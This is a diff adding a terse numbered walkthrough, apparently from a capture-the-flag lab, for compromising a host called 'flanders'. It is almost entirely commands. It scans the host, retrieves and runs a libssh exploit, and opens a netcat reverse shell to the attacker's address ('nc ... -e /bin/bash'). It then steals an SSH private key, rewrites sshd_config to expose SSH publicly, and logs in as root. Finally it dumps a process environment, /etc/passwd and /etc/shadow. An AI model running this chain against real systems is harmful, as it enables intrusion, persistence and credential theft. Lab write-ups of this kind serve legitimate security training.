@@ -1,0 +1,31 @@
+1. apply nmap -sS -sV -sC -p- 10.0.100.34 -vvv -oN scanneo_flanders
+2. typing nc 10.0.100.34 6022, I getting service name
+3. apply serchsploit libssh
+4. later typing searchsploit -m linux/remote/46307.py
+5. apply cat 46307.py
+6. apply python 46307.py 10.0.100.34 6022 "whoami|nc -h"
+7. open any port with nc, for example nc -nlvp 1023
+8. apply python3 46307.py 10.0.100.34 6022 "nc 10.10.0.118 1023 -e /bin/bash" &
+9. see the active conection, prove it.
+10. I'm gonna to that better terminal apply python3 -c "import pty;
+ pty.spawn('/bin/bash')"
+ 11. ls -ls
+12. get in archive .ssh
+13. getting private key, view file mykey with cat mykey
+14. ss -ant  this command show it listen  service on the system
+15. Checking for running process provided more a few more details
+    ps -eafww 
+16. add conection ssh root@localhost -i mykey
+16.1 or ssh -p 22 -i ~/.ssh/mykey root@127.0.0.1
+17. move us at /etc/ssh
+18. typing cat sshd_config 
+19. apply sed -i -e 's/ListenAddress 127.0.0.1/ListenAddress 0.0.0.0/' sshd_config
+20. typing service ssh restart
+21. move us at /home/ETSCTF/.ssh and copy mykey
+22. paste key's content in new file named key and give it access user with
+    chmod 700 key
+23. typing in our console to access to machine flanders's root
+23.1 ssh root@10.0.100.34 -i key password OkilyDokily
+24. flags, desktop and later typing ps -ef and process is other flag
+24.1. typing cat /proc/19/environ
+24.2. cat /etc/passwd cat /etc/shadow
